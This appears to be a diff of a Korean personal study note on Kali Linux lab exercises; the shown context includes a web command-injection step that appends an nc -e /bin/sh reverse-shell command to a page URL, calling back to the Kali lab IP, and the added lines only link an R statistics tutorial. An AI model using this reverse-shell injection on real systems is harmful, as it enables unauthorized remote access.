@@ -160,3 +160,7 @@ kali
 > 홈페이지 주소 창 뒤에 cmd=nc 10.0.2.6(칼리 IP) 7000  -e /bin/sh
 >  shell 창에서 connect 된 거 볼 수 있음
 
+
+#### [참고자료]
+https://wikidocs.net/73468 //R 통계 기초 점추정량 보고!! 전문과정 들어가기 전에 보깅
+
